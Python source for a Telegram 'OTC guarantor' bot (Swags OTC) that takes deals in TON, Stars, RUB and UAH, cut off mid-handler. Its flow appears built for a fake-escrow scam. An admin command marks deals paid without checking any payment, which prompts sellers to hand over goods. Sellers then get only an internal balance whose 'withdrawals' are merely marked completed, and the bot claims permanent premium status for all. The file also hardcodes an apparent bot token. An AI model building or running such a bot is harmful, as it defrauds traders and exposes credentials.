import asyncio
import json
import os
import uuid
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# ========== КОНФИГ ==========
BOT_TOKEN = "8924234430:AAHEGXxpP2fvQGceAtyfvW514QcfG_F9jiQ"
MASTER_ADMIN_ID = 8002472821
SUPPORT_LINK = "https://t.me/swags_support_bot"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ========== ФАЙЛЫ ==========
DEALS_FILE = "deals.json"
USERS_FILE = "users.json"
ADMINS_FILE = "admins.json"
BALANCE_FILE = "balance.json"
REKVISITS_FILE = "rekvisits.json"
START_PHOTO_FILE = "start_photo.json"
WITHDRAW_REQUESTS_FILE = "withdraw_requests.json"

def load_deals():
    if os.path.exists(DEALS_FILE):
        with open(DEALS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_deals(deals):
    with open(DEALS_FILE, 'w', encoding='utf-8') as f:
        json.dump(deals, f, indent=2, ensure_ascii=False)

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return set(json.load(f))
    return {MASTER_ADMIN_ID}

def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(list(admins), f, indent=2)

def load_balance():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_balance(balance):
    with open(BALANCE_FILE, 'w', encoding='utf-8') as f:
        json.dump(balance, f, indent=2, ensure_ascii=False)

def load_rekvisits():
    if os.path.exists(REKVISITS_FILE):
        with open(REKVISITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {
        "ton": "💎 ОПЛАТА TON\n\nПереведите TON на кошелек:\nUQCD3wX5Y5G5d8F5J8K9L0Z1X2C3V4B5N6M7A8S9D0F1G2H3\n\nСумма: {amount} TON",
        "stars": "⭐️ ОПЛАТА ЗВЁЗДАМИ\n\nОтправьте звёзды в бота: @swags_otc_bot\nИЛИ перешлите NFT подарок\n\nСумма: {amount} STARS",
        "rub": "₽ ОПЛАТА РУБЛЯМИ\n\nПереведите на карту:\n2200 1234 5678 9012\nТинькофф\n\nСумма: {amount} RUB",
        "uah": "₴ ОПЛАТА ГРИВНАМИ\n\nПереведите на карту:\n4149 5678 1234 5678\nПриватБанк\n\nСумма: {amount} UAH"
    }

def save_rekvisits(rekvisits):
    with open(REKVISITS_FILE, 'w', encoding='utf-8') as f:
        json.dump(rekvisits, f, indent=2, ensure_ascii=False)

def load_start_photo():
    if os.path.exists(START_PHOTO_FILE):
        with open(START_PHOTO_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"file_id": None}

def save_start_photo(data):
    with open(START_PHOTO_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)

def load_withdraw_requests():
    if os.path.exists(WITHDRAW_REQUESTS_FILE):
        with open(WITHDRAW_REQUESTS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_withdraw_requests(requests):
    with open(WITHDRAW_REQUESTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(requests, f, indent=2, ensure_ascii=False)

deals = load_deals()
users = load_users()
admins = load_admins()
balance = load_balance()
rekvisits = load_rekvisits()
start_photo = load_start_photo()
withdraw_requests = load_withdraw_requests()
BOT_USERNAME = "swags_otc_bot"

# ========== FSM ==========
class DealStates(StatesGroup):
    waiting_for_product = State()
    waiting_for_currency = State()
    waiting_for_amount = State()
    waiting_for_buyer_username = State()

class RekvStates(StatesGroup):
    waiting_for_rekv_type = State()
    waiting_for_rekv_text = State()

class PhotoStates(StatesGroup):
    waiting_for_photo = State()

class WithdrawStates(StatesGroup):
    waiting_for_currency = State()
    waiting_for_details = State()

# ========== КЛАВИАТУРЫ ==========
def main_menu(user_id):
    buttons = [
        [KeyboardButton(text="📦 Создать сделку")],
        [KeyboardButton(text="💰 Баланс и вывод")],
        [KeyboardButton(text="ℹ️ Мои сделки")],
        [KeyboardButton(text="⭐️ Премиум")],
        [KeyboardButton(text="❓ Частые вопросы")],
        [KeyboardButton(text="🆘 Поддержка")]
    ]
    if is_admin(user_id):
        buttons.append([KeyboardButton(text="👑 Админ-панель")])
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)

def currency_keyboard():
    buttons = [
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="₽ RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="₴ UAH", callback_data="curr_UAH")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def withdraw_currency_keyboard():
    buttons = [
        [InlineKeyboardButton(text="💎 TON", callback_data="withdraw_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="withdraw_STARS")],
        [InlineKeyboardButton(text="₽ RUB", callback_data="withdraw_RUB")],
        [InlineKeyboardButton(text="₴ UAH", callback_data="withdraw_UAH")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🖼 Изменить фото при старте", callback_data="change_photo")],
        [InlineKeyboardButton(text="➕ Добавить админа", callback_data="add_admin")],
        [InlineKeyboardButton(text="➖ Удалить админа", callback_data="remove_admin")],
        [InlineKeyboardButton(text="📋 Список админов", callback_data="list_admins")],
        [InlineKeyboardButton(text="💳 Реквизиты оплаты", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text="📊 Все сделки", callback_data="all_deals")],
        [InlineKeyboardButton(text="💸 Заявки на вывод", callback_data="withdraw_requests")]
    ])

def rekvisits_edit_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 Изменить TON", callback_data="edit_ton")],
        [InlineKeyboardButton(text="⭐️ Изменить STARS", callback_data="edit_stars")],
        [InlineKeyboardButton(text="₽ Изменить RUB", callback_data="edit_rub")],
        [InlineKeyboardButton(text="₴ Изменить UAH", callback_data="edit_uah")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_admin")]
    ])

def seller_confirm_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 ПЕРЕДАЛ ТОВАР", callback_data=f"seller_done_{deal_id}")]
    ])

# ========== ПОМОЩНИКИ ==========
def is_admin(user_id: int) -> bool:
    return user_id in admins

async def log_to_master(text: str):
    try:
        await bot.send_message(MASTER_ADMIN_ID, text)
    except:
        pass

def get_balance(user_id: int) -> dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
        save_balance(balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_balance(balance)

def get_rekvisits_text(currency, amount):
    curr_key = currency.lower()
    if curr_key in rekvisits:
        return rekvisits[curr_key].format(amount=amount, currency=currency)
    return rekvisits.get("stars", "Реквизиты не заданы").format(amount=amount, currency=currency)

async def send_welcome_message(message: types.Message):
    welcome_text = """✨ SWAGS OTC — БЕЗОПАСНЫЕ СДЕЛКИ ✨

🛡 Почему мы?
• 🤝 Честные сделки между продавцами и покупателями
• 💎 TON | ⭐️ STARS | ₽ RUB | ₴ UAH
• 🔒 Гарант безопасности с обеих сторон
• 💎 Премиум поддержка 24/7

📌 Как это работает:
1️⃣ Продавец создаёт сделку
2️⃣ Покупатель оплачивает по реквизитам
3️⃣ Администратор проверяет оплату
4️⃣ Продавец передаёт товар
5️⃣ Сделка завершена! 🎉

👇 Начните прямо сейчас 👇"""
    
    if start_photo.get("file_id"):
        try:
            await message.answer_photo(
                photo=start_photo["file_id"],
                caption=welcome_text,
                reply_markup=main_menu(message.from_user.id)
            )
            return
        except:
            pass
    
    await message.answer(
        welcome_text,
        reply_markup=main_menu(message.from_user.id)
    )

# ========== СТАРТ ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    global BOT_USERNAME
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        if deal_id not in deals:
            await message.answer("❌ Сделка не найдена или уже завершена.")
            return
        
        deal = deals[deal_id]
        
        if message.from_user.username != deal["buyer_username"]:
            await message.answer(
                f"❌ Доступ запрещён!\n\nЭта сделка предназначена для @{deal['buyer_username']}\n\nОбратитесь в поддержку: {SUPPORT_LINK}"
            )
            await log_to_master(f"⚠️ НЕСАНКЦИОНИРОВАННЫЙ ЗАХОД\nСделка: #{deal_id}\nПопытался: @{message.from_user.username}\nОжидался: @{deal['buyer_username']}")
            return
        
        if deal["status"] != "waiting_payment":
            await message.answer(f"❌ Сделка уже в статусе: {deal['status']}")
            return
        
        pay_text = get_rekvisits_text(deal["currency"], deal["amount"])
        
        await message.answer(
            f"🛒 СДЕЛКА #{deal_id}\n\n"
            f"📦 Товар: {deal['product']}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Продавец: @{deal['seller_username']}\n\n"
            f"💳 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ:\n{pay_text}\n\n"
            f"✨ После оплаты администратор проверит платёж ✨"
        )
        
        await log_to_master(
            f"👁 ПОКУПАТЕЛЬ ЗАШЁЛ В СДЕЛКУ\n"
            f"Сделка: #{deal_id}\n"
            f"Покупатель: {message.from_user.full_name} (@{message.from_user.username})"
        )
        return
    
    await send_welcome_message(message)

# ========== БАЛАНС И ВЫВОД ==========
@dp.message(F.text == "💰 Баланс и вывод")
async def show_balance(message: types.Message):
    user_balance = get_balance(message.from_user.id)
    text = f"""💰 ВАШ БАЛАНС 💰

💎 TON: {user_balance['ton']}
⭐️ STARS: {user_balance['stars']}
₽ RUB: {user_balance['rub']}
₴ UAH: {user_balance['uah']}

Для вывода средств нажмите кнопку ниже 👇"""
    
    await message.answer(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💸 ВЫВЕСТИ СРЕДСТВА", callback_data="start_withdraw")]
        ])
    )

@dp.callback_query(lambda c: c.data == "start_withdraw")
async def start_withdraw(callback: types.CallbackQuery, state: FSMContext):
    user_balance = get_balance(callback.from_user.id)
    has_money = any(v > 0 for v in user_balance.values())
    
    if not has_money:
        await callback.answer("❌ У вас нет средств для вывода", show_alert=True)
        return
    
    await callback.message.answer("💰 Выберите валюту для вывода:", reply_markup=withdraw_currency_keyboard())
    await state.set_state(WithdrawStates.waiting_for_currency)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("withdraw_"))
async def withdraw_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    user_balance = get_balance(callback.from_user.id)
    curr_key = currency.lower()
    
    if user_balance.get(curr_key, 0) <= 0:
        await callback.answer(f"❌ У вас нет средств в {currency}", show_alert=True)
        return
    
    await state.update_data(withdraw_currency=currency, withdraw_amount=user_balance[curr_key])
    
    if currency == "STARS":
        await callback.message.answer("⭐️ Введите ваш Telegram username для получения звёзд:\n\nПример: @john_doe")
    else:
        await callback.message.answer(f"💸 Введите реквизиты для вывода {currency}:\n\nПример для TON: UQ...\nПример для RUB/UAH: номер карты или кошелёк")
    
    await state.set_state(WithdrawStates.waiting_for_details)
    await callback.answer()

@dp.message(WithdrawStates.waiting_for_details)
async def withdraw_details(message: types.Message, state: FSMContext):
    data = await state.get_data()
    currency = data["withdraw_currency"]
    amount = data["withdraw_amount"]
    details = message.text.strip()
    
    request_id = str(uuid.uuid4())[:8]
    withdraw_requests[request_id] = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "full_name": message.from_user.full_name,
        "currency": currency,
        "amount": amount,
        "details": details,
        "status": "pending",
        "created_at": datetime.now().isoformat()
    }
    save_withdraw_requests(withdraw_requests)
    
    await bot.send_message(
        MASTER_ADMIN_ID,
        f"💸 НОВАЯ ЗАЯВКА НА ВЫВОД #{request_id}\n\n"
        f"👤 Пользователь: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"💰 Сумма: {amount} {currency}\n"
        f"📝 Реквизиты: {details}\n\n"
        f"Для подтверждения введите: /confirm_withdraw {request_id}"
    )
    
    await message.answer(
        f"✅ Заявка на вывод #{request_id} создана!\n\n"
        f"💰 Сумма: {amount} {currency}\n"
        f"⏳ Ожидайте вывода в течение 1-5 минут.\n\n"
        f"Статус заявки можно узнать по команде /withdraw_status {request_id}"
    )
    
    await log_to_master(f"💸 Новая заявка на вывод: #{request_id} от @{message.from_user.username}")
    await state.clear()

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔️ Недостаточно прав")
        return
    
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❌ Использование: /confirm_withdraw [ID заявки]")
        return
    
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ Заявка {request_id} не найдена")
        return
    
    req = withdraw_requests[request_id]
    if req["status"] != "pending":
        await message.answer(f"❌ Заявка уже обработана: {req['status']}")
        return
    
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    req["completed_by"] = message.from_user.id
    save_withdraw_requests(withdraw_requests)
    
    user_balance = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if user_balance.get(curr_key, 0) >= req["amount"]:
        user_balance[curr_key] -= req["amount"]
        save_balance(balance)
    
    try:
        await bot.send_message(
            req["user_id"],
            f"✅ ВЫВОД СРЕДСТВ ПОДТВЕРЖДЁН!\n\n"
            f"💰 Сумма: {req['amount']} {req['currency']}\n"
            f"📝 Реквизиты: {req['details']}\n\n"
            f"Средства отправлены в течение 1-5 минут."
        )
    except:
        pass
    
    await message.answer(f"✅ Вывод #{request_id} подтверждён! Средства списаны с баланса.")
    await log_to_master(f"✅ Вывод #{request_id} подтверждён админом @{message.from_user.username}")

@dp.message(Command("withdraw_status"))
async def withdraw_status(message: types.Message):
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❌ Использование: /withdraw_status [ID заявки]")
        return
    
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ Заявка {request_id} не найдена")
        return
    
    req = withdraw_requests[request_id]
    status_text = {
        "pending": "⏳ В обработке",
        "completed": "✅ Выполнен"
    }.get(req["status"], req["status"])
    
    await message.answer(
        f"📋 СТАТУС ЗАЯВКИ #{request_id}\n\n"
        f"💰 Сумма: {req['amount']} {req['currency']}\n"
        f"📅 Создана: {req['created_at'][:19]}\n"
        f"📊 Статус: {status_text}"
    )

# ========== СОЗДАНИЕ СДЕЛКИ ==========
@dp.message(F.text == "📦 Создать сделку")
async def create_deal_start(message: types.Message, state: FSMContext):
    await message.answer("📝 Опишите товар или услугу, которую вы продаёте:\n\nПример: NFT-подарок Telegram Premium")
    await state.set_state(DealStates.waiting_for_product)

@dp.message(DealStates.waiting_for_product)
async def get_product(message: types.Message, state: FSMContext):
    await state.update_data(product=message.text.strip())
    await message.answer("💱 Выберите валюту сделки:", reply_markup=currency_keyboard())
    await state.set_state(DealStates.waiting_for_currency)

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    await callback.message.edit_text(f"💰 Введите сумму сделки (только число):\nВалюта: {currency}")
    await state.set_state(DealStates.waiting_for_amount)
    await callback.answer()

@dp.message(DealStates.waiting_for_amount)
async def get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        await message.answer("👤 Введите Telegram username покупателя (без @):\n\nПример: john_doe\n\n⚠️ Только этот пользователь сможет зайти в сделку!")
        await state.set_state(DealStates.waiting_for_buyer_username)
    except:
        await message.answer("❌ Введите положительное число, например: 1500")

@dp.message(DealStates.waiting_for_buyer_username)
async def get_buyer(message: types.Message, state: FSMContext):
    buyer_username = message.text.strip().replace("@", "").lower()
    data = await state.get_data()
    
    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": message.from_user.id,
        "seller_username": message.from_user.username,
        "buyer_username": buyer_username,
        "product": data["product"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "waiting_payment",
        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None
    }
    save_deals(deals)
    
    deal_link = f"https://t.me/swags_otc_bot?start=deal_{deal_id}"
    
    await message.answer(
        f"✅ Сделка #{deal_id} создана!\n\n"
        f"💰 Сумма: {data['amount']} {data['currency']}\n"
        f"📦 Товар: {data['product']}\n"
        f"👤 Покупатель: @{buyer_username}\n\n"
        f"🔗 Отправьте ссылку покупателю:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔗 ОТПРАВИТЬ ССЫЛКУ ПОКУПАТЕЛЮ", url=deal_link)]
        ])
    )
    
    await log_to_master(
        f"🆕 СОЗДАНА СДЕЛКА\n"
        f"ID: #{deal_id}\n"
        f"Продавец: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Покупатель: @{buyer_username}\n"
        f"Сумма: {data['amount']} {data['currency']}\n"
        f"Товар: {data['product']}"
    )
    await state.clear()

# ========== КОМАНДА /PAY ==========
@dp.message(Command("pay"))
async def pay_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔️ Недостаточно прав")
        return
    
    args = message.text.split()
    if len(args) != 2:
        await message.answer("❌ Использование: /pay [ID сделки]\nПример: /pay a3f2b1c4")
        return
    
    deal_id = args[1]
    if deal_id not in deals:
        await message.answer(f"❌ Сделка с ID {deal_id} не найдена")
        return
    
    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"❌ Сделка уже в статусе {deal['status']}")
        return
    
    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_deals(deals)
    
    await log_to_master(
        f"💸 ОПЛАТА ПОДТВЕРЖДЕНА\n"
        f"Сделка: #{deal_id}\n"
        f"Админ: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Продавец: @{deal['seller_username']}\n"
        f"Сумма: {deal['amount']} {deal['currency']}"
    )
    
    try:
        await bot.send_message(
            deal["seller_id"],
            f"💎 СДЕЛКА #{deal_id} ОПЛАЧЕНА! 💎\n\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"📦 Товар: {deal['product']}\n"
            f"👤 Покупатель: @{deal['buyer_username']}\n\n"
            f"✅ Можете передавать товар покупателю!\n\n"
            f"После передачи нажмите кнопку 👇",
            reply_markup=seller_confirm_keyboard(deal_id)
        )
        await message.answer(f"✅ Продавцу отправлено уведомление об оплате сделки {deal_id}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ========== ПРОДАВЕЦ ПОДТВЕРЖДАЕТ ПЕРЕДАЧУ ==========
@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
async def seller_delivered(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[-1]
    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена")
        return
    
    deal = deals[deal_id]
    if deal["status"] != "paid":
        await callback.answer("❌ Оплата ещё не подтверждена")
        return
    
    add_balance(deal["seller_id"], deal["currency"], deal["amount"])
    
    deal["status"] = "completed"
    deal["completed_at"] = datetime.now().isoformat()
    save_deals(deals)
    
    await log_to_master(
        f"🎉 СДЕЛКА ЗАВЕРШЕНА\n"
        f"ID: #{deal_id}\n"
        f"Продавец: @{deal['seller_username']}\n"
        f"Покупатель: @{deal['buyer_username']}\n"
        f"Сумма: {deal['amount']} {deal['currency']} (зачислена на баланс)"
    )
    
    await callback.answer("✅ Товар передан!")
    await callback.message.edit_text(callback.message.text + "\n\n✅ СДЕЛКА ЗАВЕРШЕНА 💎")
    
    await bot.send_message(
        deal["seller_id"],
        f"🎉 Сделка #{deal_id} успешно завершена! 💎\n\n"
        f"💰 {deal['amount']} {deal['currency']} зачислены на ваш баланс.\n\n"
        f"Баланс можно проверить в главном меню."
    )

# ========== МОИ СДЕЛКИ ==========
@dp.message(F.text == "ℹ️ Мои сделки")
async def my_deals(message: types.Message):
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == message.from_user.id:
            user_deals.append((d_id, d))
    
    if not user_deals:
        await message.answer("📭 У вас нет сделок.", reply_markup=main_menu(message.from_user.id))
        return
    
    text = "📋 ВАШИ СДЕЛКИ\n\n"
    for d_id, d in user_deals[-10:]:
        status_emoji = {"waiting_payment": "⏳ ожидает оплаты", "paid": "✅ оплачено", "completed": "🎉 завершена"}.get(d['status'], d['status'])
        text += f"{d_id} | {d['amount']} {d['currency']} | {status_emoji}\n   → {d['product'][:30]}\n\n"
    
    await message.answer(text, reply_markup=main_menu(message.from_user.id))

# ========== ПРЕМИУМ ==========
@dp.message(F.text == "⭐️ Премиум")
async def premium_info(message: types.Message):
    await message.answer(
        "✨ ПРЕМИУМ СТАТУС ✨\n\n"
        "💎 Привилегии:\n"
        "• Приоритетная поддержка 24/7\n"
        "• Сниженная комиссия (0%)\n"
        "• Ранний доступ к новым функциям\n"
        "• Эксклюзивные NFT-награды\n\n"
        "⭐️ Ваш статус: АКТИВЕН (бессрочно)\n\n"
        "Спасибо, что вы с нами! 🚀"
    )

# ========== ЧАСТЫЕ ВОПРОСЫ ==========
@dp.message(F.text == "❓ Частые вопросы")
async def faq(message: types.Message):
    faq_text = """
❓ ЧАСТЫЕ ВОПРОСЫ

🔹 Как начать сделку?
Просто нажмите «📦 Создать сделку» и следуйте инструкции.

🔹 Какие валюты доступны?
💎 TON | ⭐️ STARS | ₽ RUB | ₴ UAH

🔹 Как я получу оплату?
После завершения сделки деньги зачисляются на ваш баланс. Вы можете вывести их в любое время.

🔹 Как вывести деньги?
Нажмите «💰 Баланс и вывод», выберите валюту и укажите реквизиты.

🔹 Безопасно ли это?
Да! Администратор проверяет каждую оплату перед тем, как разрешить передачу товара.

🔹 Сколько времени занимает вывод?
Обычно 1-5 минут после подтверждения администратором.

🔹 Как связаться с поддержкой?
Нажмите кнопку «🆘 Поддержка» ниже
"""
    await message.answer(faq_text, reply_markup=main_menu(message.from_user.id))

# ========== ПОДДЕРЖКА ==========
@dp.message(F.text == "🆘 Поддержка")
async def support(message: types.Message):
    await message.answer(
        f"🆘 Служба поддержки Swags OTC\n\n"
        f"📞 Связь с оператором:\n{SUPPORT_LINK}\n\n"
        f"📝 Что писать в поддержку:\n"
        f"• ID сделки (если есть)\n"
        f"• Подробное описание проблемы\n"
        f"• Скриншоты\n\n"
        f"⏰ Время ответа: до 15 минут\n\n"
        f"✨ Мы всегда готовы помочь!",
        reply_markup=main_menu(message.from_user.id),
        disable_web_page_preview=True
    )

# ========== АДМИН-ПАНЕЛЬ ==========
@dp.message(F.text == "👑 Админ-панель")
async def admin_panel(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    await message.answer("👑 Панель администратора\n\nВыберите действие:", reply_markup=admin_panel_keyboard())

@dp.callback_query(lambda c: c.data == "withdraw_requests")
async def show_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    
    pending = {rid: req for rid, req in withdraw_requests.items() if req["status"] == "pending"}
    
    if not pending:
        await callback.message.answer("📭 Нет активных заявок на вывод")
    else:
        text = "💸 ЗАЯВКИ НА ВЫВОД\n\n"
        for rid, req in pending.items():
            text += f"#{rid} | {req['amount']} {req['currency']} | @{req['username']}\n"
            text += f"📝 {req['details'][:50]}\n"
            text += f"➡️ /confirm_withdraw {rid}\n\n"
        await callback.message.answer(text)
    await callback.answer()

# ========== ИЗМЕНЕНИЕ ФОТО ==========
@dp.callback_query(lambda c: c.data == "change_photo")
async def change_photo_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    await callback.message.answer("📷 Отправьте новое фото для приветственного сообщения.\n\nФото должно быть в формате JPEG или PNG.")
    await state.set_state(PhotoStates.waiting_for_photo)
    await callback.answer()

@dp.message(PhotoStates.waiting_for_photo)
async def save_photo_handler(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await message.answer("⛔️ Доступ запрещён")
        await state.clear()
        return
    
    if message.photo:
        file_id = message.photo[-1].file_id
        start_photo["file_id"] = file_id
        save_start_photo(start_photo)
        await message.answer("✅ Фото для приветственного сообщения обновлено!")
        await log_to_master(f"🖼 Админ {message.from_user.full_name} изменил фото при старте")
    else:
        await message.answer("❌ Отправьте фото, а не другой файл")
    
    await state.clear()

# ========== РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ ==========
@dp.callback_query(lambda c: c.data == "edit_rekvisits")
async def edit_rekvisits_panel(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    await callback.message.edit_text("💳 Редактирование реквизитов оплаты\n\nВыберите валюту для изменения:", reply_markup=rekvisits_edit_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_ton")
async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    await callback.message.answer("📝 Введите новый текст для оплаты TON:\n\nИспользуйте {amount} для подстановки суммы")
    await state.update_data(rekv_type="ton")
    await state.set_state(RekvStates.waiting_for_rekv_text)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_stars")
async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    await callback.message.answer("📝 Введите новый текст для оплаты STARS:\n\nИспользуйте {amount} для подстановки суммы")
    await state.update_data(rekv_type="stars")
    await state.set_state(RekvStates.waiting_for_rekv_text)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_rub")
async def edit_rub(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    await callback.message.answer("📝 Введите новый текст для оплаты RUB:\n\nИспользуйте {amount} для подстановки суммы")
    await state.update_data(rekv_type="rub")
    await state.set_state(RekvStates.waiting_for_rekv_text)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_uah")
async def edit_uah(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    await callback.message.answer("📝 Введите новый текст для оплаты UAH:\n\nИспользуйте {amount} для подстановки суммы")
    await state.update_data(rekv_type="uah")
    await state.set_state(RekvStates.waiting_for_rekv_text)
    await callback.answer()

@dp.message(RekvStates.waiting_for_rekv_text)
async def save_rekv_text(message: types.Message, state: FSMContext):
    data = await state.get_data()
    rekv_type = data.get("rekv_type")
    if rekv_type:
        rekvisits[rekv_type] = message.text.strip()
        save_rekvisits(rekvisits)
        await message.answer(f"✅ Реквизиты для {rekv_type.upper()} обновлены!")
        await log_to_master(f"💳 Админ {message.from_user.full_name} изменил реквизиты для {rekv_type.upper()}")
    await state.clear()

@dp.callback_query(lambda c: c.data == "back_to_admin")
async def back_to_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    await callback.message.edit_text("👑 Панель администратора\n\nВыберите действие:", reply_markup=admin_panel_keyboard())
    await callback.answer()

# ========== УПРАВЛЕНИЕ АДМИНАМИ ==========
@dp.callback_query(lambda c: c.data == "add_admin")
async def add_admin_prompt(callback: types.CallbackQuery):
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer("⛔️ Только главный админ", show_alert=True)
        return
    await callback.message.answer("📝 Введите Telegram ID пользователя для добавления в админы:")
    await callback.answer()

@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def add_admin_process(message: types.Message):
    user_id = int(message.text.strip())
    admins.add(user_id)
    save_admins(admins)
    await message.answer(f"✅ Пользователь {user_id} теперь администратор!")
    await log_to_master(f"👑 Новый админ добавлен: {user_id}")

@dp.callback_query(lambda c: c.data == "remove_admin")
async def remove_admin_prompt(callback: types.CallbackQuery):
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer("⛔️ Только главный админ", show_alert=True)
        return
    await callback.message.answer("📝 Введите Telegram ID пользователя для удаления из админов:")
    await callback.answer()

@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def remove_admin_process(message: types.Message):
    user_id = int(message.text.strip())
    if user_id == MASTER_ADMIN_ID:
        await message.answer("❌ Нельзя удалить главного админа")
        return
    if user_id in admins:
        admins.remove(user_id)
        save_admins(admins)
        await message.answer(f"✅ Пользователь {user_id} больше не администратор.")
        await log_to_master(f"👑 Админ удалён: {user_id}")
    else:
        await message.answer("❌ Не найден")

@dp.callback_query(lambda c: c.data == "list_admins")
